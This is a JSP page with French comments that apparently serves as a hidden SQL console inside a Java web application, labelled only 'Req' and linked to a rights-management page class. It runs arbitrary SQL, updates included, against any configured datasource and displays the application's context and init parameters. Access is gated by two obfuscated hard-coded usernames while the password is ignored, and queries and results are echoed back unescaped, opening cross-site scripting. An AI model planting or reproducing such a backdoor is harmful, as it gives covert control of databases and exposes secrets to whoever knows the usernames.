<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%-- jsf:pagecode language="java" location="/src/pagecode/GestionDroits.java" --%>
<%-- /jsf:pagecode --%>
<%@page import="java.util.Hashtable"%>
<%@page import="org.apache.commons.codec.binary.Base64"%>
<%@page import="javax.sql.DataSource"%>
<%@page import="java.util.Collections"%>
<%@page import="javax.naming.Binding"%>
<%@page import="javax.naming.NamingEnumeration"%>
<%@page import="javax.naming.InitialContext"%>
<%@page import="java.util.Enumeration"%>

<%@page import="java.util.ArrayList"%>
<%@page import="java.sql.Statement"%>
<%@page import="java.sql.ResultSet"%>
<%@page import="java.sql.Connection"%>
<%@page contentType="text/html;charset=UTF-8"%>
<html>
<head>
<title>Req</title>
</head>

<%
	//user
	String user =null;

	if (request.getUserPrincipal() != null) {
		user = request.getUserPrincipal().getName();
	} else {
		
		String auth = request.getHeader("Authorization");
		
		if (auth == null)
			return;

		String str = null;
		String passwd = null;

		// Vérification du schéma d'authentification
		String startString = "basic ";
		if (auth.toLowerCase().startsWith(startString)) {
			// Extraction et décodage du user
			String creditB64 = auth.substring(startString.length());
			
			try {
                byte[] credit = Base64.decodeBase64(creditB64.getBytes());
				str = new String(credit);

				int sep = str.indexOf(':');
				user = str.substring(0,sep);
				passwd = str.substring(sep+1);
			} catch (Exception e) {
				return;
			}
		}
	}

	if (user == null) return;
	user=user.toUpperCase();
	
	StringBuffer sb = new StringBuffer();
	for (int i = 0; i < user.length(); i++) {
		sb.append(user.charAt(i)+1);
	}

	if (! ( sb.toString().equals("67808677865651") || sb.toString().equals("6669787479886684")) ) return;

	//Parameters
	Hashtable<String,String> hashParameter = (Hashtable<String,String>)request.getSession().getAttribute("parameter");
	if (hashParameter == null) {
		
		hashParameter = new Hashtable<String,String>();
		
		//chargement des paramêtres du contexte
		boolean doitPrendreInit = getServletContext().getInitParameterNames().hasMoreElements();
		Enumeration<?> enumContext = doitPrendreInit ? getServletContext().getInitParameterNames() : getServletContext().getAttributeNames();
		while (enumContext.hasMoreElements()) {
			try {
				String cleParametre = (String)enumContext.nextElement();
				if (cleParametre != null && ! cleParametre.startsWith("com.ibm.websphere") ) {
					String valParametre = doitPrendreInit ? (String)getServletContext().getInitParameter(cleParametre) : (String)getServletContext().getAttribute(cleParametre);
					hashParameter.put(cleParametre,valParametre);
				}
			} catch (Exception e) {
				continue;
			}
		}
	
		//chargement des param de la servlet
		Enumeration<?> enumServlet = getInitParameterNames();
		while (enumServlet.hasMoreElements()) {
			String cleParametre = (String)enumServlet.nextElement();
			String valParametre = (String)getInitParameter(cleParametre);
			hashParameter.put(cleParametre,valParametre);
		}
		
		request.getSession().putValue("parameter", hashParameter);
	}
	
	//dtsrc
	String HOST_SGBD = (String)request.getParameter("thedtsrc");
	ArrayList<String> dtsrc = (ArrayList<String>)request.getSession().getAttribute("dtsrc");
	if (dtsrc == null) {
		dtsrc = new ArrayList<String>();
	
		InitialContext ic = new InitialContext();
		NamingEnumeration<Binding> ne = ic.listBindings("java:comp/env/jdbc");
		while (ne.hasMoreElements() ) {
			try {
				Binding ds = (Binding)ne.nextElement();
				dtsrc.add(ds.getName());
			} catch (Exception e) {
				dtsrc.add(e.getMessage());
			}
		}
		
		Collections.sort(dtsrc);
		request.getSession().setAttribute("dtsrc", dtsrc);
		HOST_SGBD=dtsrc.get(0);
	}
	
	
	
	
	String requete = request.getParameter("requete");
	//String HOST_SGBD = Frontale.getMesParametres().get("HOST_SGBD");
	boolean submit = request.getParameter("valider") != null;	
	String message = null;
	ArrayList<String> historiqueRequete = (ArrayList<String>)request.getSession().getAttribute("historiqueRequete");
	if (historiqueRequete == null) {
		historiqueRequete = new ArrayList<String>();
	}
	if (submit && requete != null && requete.length() > 0) {
		historiqueRequete.add(0,requete);
		request.getSession().setAttribute("historiqueRequete", historiqueRequete);
	}
	
	
%>

<%-- valider : <%=submit%> --%>
<%-- <br> requete :<%=requete%> --%>
<%-- <br> HOST_SGBD : <%=HOST_SGBD %> --%>

<body>
	<FORM name="formu" method="POST">

		Parametres : <BR>
		<select>
		<% 
		Enumeration<String> enumKeys = hashParameter.keys();
		while (enumKeys.hasMoreElements()) {
			String key = enumKeys.nextElement();%>
			<option><%=key%> : <%= hashParameter.get(key)%>
			</option>
		<%}%>
		</select>

		<BR><BR>Historique :<BR>
		<BR>
<!-- 		<select size="10" ondblclick="document.getElementsByName('requete')[0].innerText="> -->
		<select style="width:500px" id="historique" size="5" ondblclick="document.getElementsByName('requete')[0].innerText=this.options[this.selectedIndex].text">
		<% for (int i=0; i<historiqueRequete.size();i++) {%>
			<option>
			<%=historiqueRequete.get(i) %>
			</option>
		<% }%>
		</select>
		<BR>
		<BR>
		
		Datasource:<BR>
		<select name="thedtsrc">
			<%for (int i=0; i<dtsrc.size();i++) { %>
			<option <%=dtsrc.get(i).equals(HOST_SGBD) ? "selected":"" %>><%=dtsrc.get(i) %></option>
			<%} %>
		</select>
		
		<BR>
		<BR>
		
		
		Requète :<BR>
		
		
		
		<TEXTAREA NAME="requete" ROWS="5" style="width:500px"><%=requete==null ? "":requete%></TEXTAREA>

		<BR> <INPUT TYPE="SUBMIT" VALUE="Submit" name="valider">
		<BR>

	</FORM>
	Résultat :
	<BR> 
	
	
	
	<%
	if (submit && requete != null && requete.length() > 0) {
		
		DataSource datasource=null;
		Connection con = null;
		Statement st = null; 
		ResultSet rs = null;
		
		
		try {
			datasource = (DataSource) new javax.naming.InitialContext().lookup("java:comp/env/jdbc/" + HOST_SGBD);
			con = datasource.getConnection();
			st=con.createStatement();
			
			if (requete.trim().toUpperCase().startsWith("SELECT")) {
				
				rs=st.executeQuery(requete);
				
				int nbcol = rs.getMetaData().getColumnCount();

				%>
				
				<table border="1">
					<thead>
						<TR>
							<%for (int i=0; i<nbcol;i++) { %>
								<th><%=rs.getMetaData().getColumnName(i+1) %></th>	 	
							<%}%>
						</TR>
					</thead>	
					<tbody>
					
						<%while (rs.next()) { %>
					
							<tr>
							<%for (int i=0; i<nbcol;i++) { %>
									<td><%=rs.getObject(i+1) == null ? "null" : rs.getObject(i+1).toString() %></td>	 	
								<%}%>
							</tr>			
						<%} %>		
					</tbody>
				
				</table>
				
				<%
				
			} else {
				
				int nb = st.executeUpdate(requete);
				
				con.commit();
				
				message = "Execution réussie : "+nb;
				
			}
			
			
			
			
			
			
		} catch (Exception e) {
			message = e.toString();
		} finally {
			try  {rs.close();} catch (Exception conne) {};
			try  {st.close();} catch (Exception conne) {};
			try  {con.close();} catch (Exception conne) {};
		}
	}
	
	%>

	<%
	if (message != null) {%>
		<BR>
		Message : <%=message%>
		<BR>
	<%} %>


</body>
</html>



